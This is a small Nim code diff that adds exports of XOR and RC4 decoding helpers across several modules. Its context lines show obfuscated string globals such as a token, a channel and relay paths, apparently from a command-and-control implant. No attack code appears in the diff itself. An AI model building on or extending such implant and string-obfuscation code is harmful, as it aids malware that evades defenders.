@@ -3,6 +3,7 @@ global_nim = {
 
 from crypt/xordec import fromXor
 from crypt/rc4 import fromRC4
+export fromXor, fromRC4
 include "../macro"
 import tables
 
@@ -48,6 +49,7 @@ var currentToken* = obf("empty")
 
 from crypt/xordec import fromXor
 from crypt/rc4 import fromRC4
+export fromXor, fromRC4
 include "../macro"
 import tables
 
@@ -79,6 +81,7 @@ var bgWorkers* = 0
 
 from crypt/xordec import fromXor
 from crypt/rc4 import fromRC4
+export fromXor, fromRC4
 include "../macro"
 import tables
 
@@ -106,6 +109,7 @@ var activeRelayPaths*: seq[string] = @[]
 
 from crypt/xordec import fromXor
 from crypt/rc4 import fromRC4
+export fromXor, fromRC4
 include "../macro"
 
 var channel* = obf("<channel>")
